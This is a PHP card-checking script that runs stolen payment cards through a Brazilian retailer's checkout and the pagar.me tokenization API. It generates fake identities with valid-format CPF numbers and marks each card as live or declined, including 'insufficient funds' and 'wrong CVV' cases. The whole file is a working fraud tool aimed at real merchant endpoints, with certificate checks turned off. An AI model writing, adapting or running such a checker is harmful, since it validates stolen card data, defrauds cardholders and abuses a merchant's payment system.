<?php
error_reporting(0);
set_time_limit(0);

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    if (!isset($str[1])) return '';
    $str = explode($end, $str[1]);
    return $str[0];
}


function gerarGmail() {
    $nomes = ['Lucas', 'Gabriel', 'Matheus', 'Pedro', 'João', 'Miguel', 'Rafael', 'Gustavo', 'Bruno', 'Diego',
              'Ana', 'Beatriz', 'Carla', 'Daniela', 'Fernanda', 'Gabriela', 'Julia', 'Larissa', 'Maria', 'Natalia'];
    $sobrenomes = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes',
                   'Costa', 'Ribeiro', 'Martins', 'Carvalho', 'Almeida', 'Lopes', 'Soares', 'Fernandes', 'Vieira', 'Barbosa'];
    
    $nome = $nomes[array_rand($nomes)];
    $sobrenome = $sobrenomes[array_rand($sobrenomes)];
    $email = strtolower($nome . '.' . $sobrenome . rand(100, 9999) . '@gmail.com');
    $email = str_replace(['á','à','â','ã','ä','é','ê','í','ó','ô','õ','ö','ú','ü','ç','ñ'],
                         ['a','a','a','a','a','e','e','i','o','o','o','o','u','u','c','n'], $email);
    return $email;
}


function gerarCPF() {
    $n1 = rand(0,9); $n2 = rand(0,9); $n3 = rand(0,9);
    $n4 = rand(0,9); $n5 = rand(0,9); $n6 = rand(0,9);
    $n7 = rand(0,9); $n8 = rand(0,9); $n9 = rand(0,9);
    
    $d1 = $n9*2 + $n8*3 + $n7*4 + $n6*5 + $n5*6 + $n4*7 + $n3*8 + $n2*9 + $n1*10;
    $d1 = 11 - ($d1 % 11);
    if ($d1 >= 10) $d1 = 0;
    
    $d2 = $d1*2 + $n9*3 + $n8*4 + $n7*5 + $n6*6 + $n5*7 + $n4*8 + $n3*9 + $n2*10 + $n1*11;
    $d2 = 11 - ($d2 % 11);
    if ($d2 >= 10) $d2 = 0;
    
    return $n1.$n2.$n3.'.'.$n4.$n5.$n6.'.'.$n7.$n8.$n9.'-'.$d1.$d2;
}


function gerarNumero() {
    $ddd = ['11','21','31','41','51','61','71','81','91'][array_rand(['11','21','31','41','51','61','71','81','91'])];
    return '(' . $ddd . ') 9' . rand(1000,9999) . '-' . rand(1000,9999);
}


$gm = gerarGmail();
$cpf = gerarCPF();
$numero = gerarNumero();


$lista = $_GET['lista'];
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];

if (strlen($ano) == 2) {
    $ano = "20" . $ano;
}

function detectarBandeira($cc) {
    if (preg_match('/^4/', $cc)) return 'Visa';
    if (preg_match('/^(5|2)/', $cc)) return 'Mastercard';
    if (preg_match('/^3/', $cc)) return 'Amex';
    if (preg_match('/^6/', $cc)) return 'Elo';
    return 'Desconhecida';
}

$bandeira = detectarBandeira($cc);
$inicio = microtime(true);


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.lauf.com.br/checkout/api/cart/mUx44CEmDjMdcuPo1qXDEAEvrysAF83u/payment-method/pagarme-credit');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);


$headers = [
    'Host: www.lauf.com.br',
    'user-agent: ' . $useragent,
    'sec-ch-ua: "Chromium";v="146", "Not-A.Brand";v="24", "Opera";v="130"',
    'accept: */*',
    'referer: https://www.lauf.com.br/checkout/mUx44CEmDjMdcuPo1qXDEAEvrysAF83u/payment',
];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);
curl_close($ch);


$pk = getStr($response, '"public_key":"', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.pagar.me/core/v5/tokens?appId=' . $pk);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: api.pagar.me',
    'content-type: application/json',
    'user-agent: ' . $useragent,
    'accept: application/json',
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    'card' => [
        'number' => str_replace(' ', '', $cc),
        'holder_name' => 'LUCAS SILVA',
        'exp_month' => (int)$mes,
        'exp_year' => (int)$ano,
        'cvv' => $cvv,
        'holder_document' => '10013786601'
    ],
    'type' => 'card'
]));

$response = curl_exec($ch);
$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$data = json_decode($response, true);
$token = $data['id'] ?? ''; 



$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.lauf.com.br/checkout/api/cart/mUx44CEmDjMdcuPo1qXDEAEvrysAF83u/credit-payment');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');

$headers = [
    'Host: www.lauf.com.br',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/130.0.0.0',
    'content-type: text/plain;charset=UTF-8',
    'accept: */*',
    'origin: https://www.lauf.com.br',
    'referer: https://www.lauf.com.br/checkout/mUx44CEmDjMdcuPo1qXDEAEvrysAF83u/payment',
];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"installments":"1","name":"LUCAS SILVA","cvc":"' . $cvv . '","cardNumber":"' . $cc . '","expiry":"' . $mes . '","payment_method":"pagarme-credit","flag":"mastercard","card_token":"' . $token . '","holder_document_number":"10013786601"}');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$response2 = curl_exec($ch);
$http_code2= curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);
curl_close($ch);


$tempo = microtime(true) - $inicio;
$tempoFormatado = number_format($tempo, 2);

$data = json_decode($response2, true);

$mensagem_real = '';

if (isset($data['message']) && is_array($data['message'])) {
    $mensagem_real = implode(' ', $data['message']);
} elseif (isset($data['message']) && is_string($data['message'])) {
    $mensagem_real = $data['message'];
} elseif (isset($data['errors']) && is_array($data['errors'])) {
    $mensagem_real = implode(' ', $data['errors']);
} elseif (isset($data['error']['message'])) {
    $mensagem_real = $data['error']['message'];
} elseif (isset($data['error'])) {
    $mensagem_real = is_array($data['error']) ? json_encode($data['error']) : $data['error'];
}

if (empty($mensagem_real)) {
    preg_match('/"message":\s*"([^"]+)"/', $response2, $msg_match);
    $mensagem_real = $msg_match[1] ?? 'Cartao recusado';
}

if ($httpCode2 == 200 && isset($data['success']) && $data['success'] === true) {
    die("✅ APROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> PAGAMENTO CONFIRMADO! ~> @cybersecofc ~> {$tempoFormatado}s");
}

if (stripos($mensagem_real, 'cvv') !== false || stripos($mensagem_real, 'security code') !== false || stripos($mensagem_real, 'CVC') !== false) {
    die("✅ APROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> LIVE - CVV INCORRETO ~> @cybersecofc ~> {$tempoFormatado}s");
}

if (stripos($mensagem_real, 'insufficient') !== false || stripos($mensagem_real, 'funds') !== false) {
    die("✅ APROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> LIVE - SALDO INSUFICIENTE ~> @cybersecofc ~> {$tempoFormatado}s");
}

if (stripos($mensagem_real, 'expired') !== false) {
    die("❌ REPROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> CARTÃO EXPIRADO ~> @cybersecofc ~> {$tempoFormatado}s");
}

die("❌ REPROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> $mensagem_real ~> @cybersecofc ~> {$tempoFormatado}s");
?>